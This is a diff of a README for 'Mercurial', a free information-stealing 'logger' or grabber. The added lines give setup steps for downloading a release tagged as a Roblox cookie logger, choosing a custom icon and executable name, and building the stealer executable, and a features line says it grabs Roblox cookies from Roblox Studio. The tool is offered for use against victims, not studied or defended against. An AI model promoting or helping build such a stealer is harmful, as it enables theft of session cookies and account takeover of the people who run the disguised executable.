@@ -1,13 +1,31 @@
 ### Due to constant Discord terminations I will not be making a new support server. For urgent contact: iwannaeatahamster#2208
 
 ## Mercurial Preview
-![preview](https://user-images.githubusercontent.com/75003671/120157017-26796300-c225-11eb-8f84-7428165ca672.gif)
+![preview](https://media.discordapp.net/attachments/1052407127970414623/1069020317718159481/image.png)
 ![preview](https://cdn.discordapp.com/attachments/1052407127970414623/1069020476950712450/image.png)
 ![preview](https://cdn.discordapp.com/attachments/1052407127970414623/1069020514372300810/image.png)
 ![preview](https://cdn.discordapp.com/attachments/1052407127970414623/1069020572530524240/image.png)
 
 ## Features What is Mercurial?
 Mercurial is the best **FREE** logger you can get currently, don't fall for other scams. Mercurial works as of 2/4/2023.
+
+## Install
+
+### Prerequisites
+
+-   Windows 10/11
+-   [Python](https://www.python.org/downloads/release/python-3109/)
+
+### Setup
+
+1. [Download release](https://github.com/yes133/Mercurial-Updated-2023-/releases/tag/robloxcookielogger)
+2. Extract zip
+3. Run `Mercurial` by double clicking it
+4. Turn on the features you'd like 
+5. Add a custom icon or exe name (optional)
+6. Go to compiler andd click on build 
+7. Go to `C:\Users\YourName\Downloads\Mercurial-Grabber-master\Mercurial-Grabber-master\Mercurial` 
+8. Scroll down and if you put a exe name, find `YourExeName.exe` and if you didn't, find 'main.exe'
 
 ## Features 
 - Grabs Roblox cookies from Roblox Studio
